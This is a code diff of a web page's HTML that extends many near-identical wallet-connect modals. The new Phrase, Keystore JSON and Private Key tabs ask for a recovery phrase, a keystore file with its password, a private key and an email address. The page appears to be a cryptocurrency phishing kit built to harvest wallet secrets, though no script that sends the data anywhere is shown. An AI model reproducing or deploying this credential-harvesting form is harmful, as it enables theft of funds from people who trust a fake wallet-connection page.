+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
                 </div>
             </div>
             <div class="modal-footer">
@@ -852,11 +1451,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" onclick="phraseback()" type="button">Phrase</button>
+                <button class="keystore" onclick="formtoggle()" type="button">Keystore JSON</button>
+                <button class="privatekey" onclick="privatekey()" type="button">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -874,7 +1473,43 @@
                     </div>
                 </div>
             </div>
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
 
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
+                </div>
+            </div>
             <div class="modal-footer">
                 <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button> <button type="submit"
                     class="proceed">Proceeed</button>
@@ -894,11 +1529,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" onclick="phraseback()" type="button">Phrase</button>
+                <button class="keystore" onclick="formtoggle()" type="button">Keystore JSON</button>
+                <button class="privatekey" onclick="privatekey()" type="button">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -914,6 +1549,43 @@
                             placeholder="Enter your 12-24 word recovery phrase"></textarea>
                         <p>Typically 12(sometimes 24) words separated by single spaces</p>
                     </div>
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
+
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
                 </div>
             </div>
             <div class="modal-footer">
@@ -935,11 +1607,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" onclick="phraseback()" type="button">Phrase</button>
+                <button class="keystore" type="button" onclick="formtoggle()">Keystore JSON</button>
+                <button class="privatekey" onclick="privatekey()" type="button">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -955,6 +1627,43 @@
                             placeholder="Enter your 12-24 word recovery phrase"></textarea>
                         <p>Typically 12(sometimes 24) words separated by single spaces</p>
                     </div>
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
+
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
                 </div>
             </div>
             <div class="modal-footer">
@@ -975,11 +1684,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" onclick="phraseback()" type="button">Phrase</button>
+                <button class="keystore" onclick="formtoggle()" type="button">Keystore JSON</button>
+                <button class="privatekey" onclick="privatekey()" type="button">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -995,6 +1704,43 @@
                             placeholder="Enter your 12-24 word recovery phrase"></textarea>
                         <p>Typically 12(sometimes 24) words separated by single spaces</p>
                     </div>
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
+
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
                 </div>
             </div>
             <div class="modal-footer">
@@ -1016,11 +1762,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" onclick="phraseback()" type="button">Phrase</button>
+                <button class="keystore" type="button" onclick="formtoggle()">Keystore JSON</button>
+                <button class="privatekey" onclick="privatekey()" type="button">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -1038,12 +1784,49 @@
                     </div>
                 </div>
             </div>
-            < <div class="modal-footer">
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
+
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
+                </div>
+            </div>
+            <div class="modal-footer">
                 <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button> <button type="submit"
                     class="proceed">Proceeed</button>
+            </div>
+        </form>
     </div>
-    </form>
-</div>
 </div>
 
 <div class="modal fade wallet-modal" id="edgeModal" tabindex="-1" aria-labelledby="edgeModalLabel" aria-hidden="true">
@@ -1056,11 +1839,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" onclick="phraseback()" type="button">Phrase</button>
+                <button class="keystore" type="button" onclick="formtoggle()">Keystore JSON</button>
+                <button class="privatekey" onclick="privatekey()" type="button">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -1076,6 +1859,43 @@
                             placeholder="Enter your 12-24 word recovery phrase"></textarea>
                         <p>Typically 12(sometimes 24) words separated by single spaces</p>
                     </div>
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
+
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
                 </div>
             </div>
             <div class="modal-footer">
@@ -1097,11 +1917,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" onclick="phraseback()" type="button">Phrase</button>
+                <button class="keystore" type="button" onclick="formtoggle()">Keystore JSON</button>
+                <button class="privatekey" onclick="privatekey()" type="button">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -1117,6 +1937,43 @@
                             placeholder="Enter your 12-24 word recovery phrase"></textarea>
                         <p>Typically 12(sometimes 24) words separated by single spaces</p>
                     </div>
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
+
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
                 </div>
             </div>
             <div class="modal-footer">
@@ -1138,11 +1995,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" onclick="phraseback()" type="button">Phrase</button>
+                <button class="keystore" type="button" onclick="formtoggle()">Keystore JSON</button>
+                <button class="privatekey" onclick="privatekey()" type="button">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -1158,6 +2015,43 @@
                             placeholder="Enter your 12-24 word recovery phrase"></textarea>
                         <p>Typically 12(sometimes 24) words separated by single spaces</p>
                     </div>
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
+
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
                 </div>
             </div>
             <div class="modal-footer">
@@ -1179,11 +2073,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" onclick="phraseback()" type="button">Phrase</button>
+                <button class="keystore" type="button" onclick="formtoggle()">Keystore JSON</button>
+                <button class="privatekey" onclick="privatekey()" type="button">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -1199,6 +2093,43 @@
                             placeholder="Enter your 12-24 word recovery phrase"></textarea>
                         <p>Typically 12(sometimes 24) words separated by single spaces</p>
                     </div>
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
+
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
                 </div>
             </div>
             <div class="modal-footer">
@@ -1220,11 +2151,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" onclick="phraseback()" type="button">Phrase</button>
+                <button class="keystore" type="button" onclick="formtoggle()">Keystore JSON</button>
+                <button class="privatekey" onclick="privatekey()" type="button">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -1240,6 +2171,43 @@
                             placeholder="Enter your 12-24 word recovery phrase"></textarea>
                         <p>Typically 12(sometimes 24) words separated by single spaces</p>
                     </div>
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
+
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
                 </div>
             </div>
             <div class="modal-footer">
@@ -1260,11 +2228,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" onclick="phraseback()" type="button">Phrase</button>
+                <button class="keystore" onclick="formtoggle()" type="button">Keystore JSON</button>
+                <button class="privatekey" onclick="privatekey()" type="button">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -1282,7 +2250,43 @@
                     </div>
                 </div>
             </div>
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
 
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
+                </div>
+            </div>
             <div class="modal-footer">
                 <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button> <button type="submit"
                     class="proceed">Proceeed</button>
